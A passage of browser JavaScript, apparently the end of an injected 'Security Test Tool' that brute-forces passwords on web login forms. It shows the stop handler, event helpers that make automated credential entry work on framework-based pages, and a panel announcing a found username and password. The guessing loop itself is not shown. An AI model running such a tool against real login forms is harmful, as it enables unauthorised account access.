                document.getElementById('stop-bf-button').style.display = 'none';

                if (!stopRequested && !successfulPassword) {
                    updateStatus('Brute-Force test completed. No successful password found.', false);
                }
            });

            document.getElementById('stop-bf-button').addEventListener('click', function () {
                stopRequested = true;
                updateStatus('Stopping Brute-Force test...', false);
            });
        }
    };

    // Helper function to trigger input events (important for JS frameworks)
    const triggerInputEvents = (element) => {
        // Focus
        element.focus();

        // Input event
        const inputEvent = new Event('input', {bubbles: true});
        element.dispatchEvent(inputEvent);

        // Change event
        const changeEvent = new Event('change', {bubbles: true});
        element.dispatchEvent(changeEvent);

        // Keydown/keyup events for extra measure
        const keydownEvent = new KeyboardEvent('keydown', {bubbles: true});
        element.dispatchEvent(keydownEvent);

        const keyupEvent = new KeyboardEvent('keyup', {bubbles: true});
        element.dispatchEvent(keyupEvent);
    };

    // Update status
    const updateStatus = (message, isError = false) => {
        const statusElement = document.getElementById('bf-status');
        if (statusElement) {
            statusElement.textContent = message;
            statusElement.style.backgroundColor = isError ? '#6b2b2b' : '#2C2E3B';
        }
    };

    // Show successful passwords
    const showSuccessMessage = (username, password) => {
        // Create or update the success element
        let successElement = document.getElementById('success-message');
        if (!successElement) {
            successElement = document.createElement('div');
            successElement.id = 'success-message';
            successElement.style.cssText = `
        margin-top: 15px;
        padding: 10px;
        background-color: #2e5b2e;
        border-radius: 5px;
        color: white;
        font-weight: bold;
      `;
            document.getElementById('security-tool-content').appendChild(successElement);
        }

        // Update the content
        successElement.innerHTML = `
      <div style="font-size: 16px; margin-bottom: 5px;">✅ Successful login found!</div>
      <div style="margin-bottom: 5px;">Username: <span style="font-family: monospace;">${username}</span></div>
      <div style="margin-bottom: 5px;">Password: <span style="font-family: monospace;">${password}</span></div>
      <div style="font-size: 12px; margin-top: 10px; color: #aaffaa;">
        Login successful - Success indicator detected
      </div>
    `;

        // Scroll to success element
        successElement.scrollIntoView({behavior: 'smooth'});

        // Update status
        updateStatus(`Success! Password found: ${password}`, false);
    };

    // Show UI
    createUI();

    // Public API for the console
    window.securityTester = {
        rescan: createUI,
        getFormFields: scanForFields,
        getForms: scanForms
    };

    console.log('%c[Security Test Tool] Tool successfully initialized!', 'color: #4a6ed3; font-weight: bold;');
    console.log('You can perform manual scans with window.securityTester.rescan()');
})();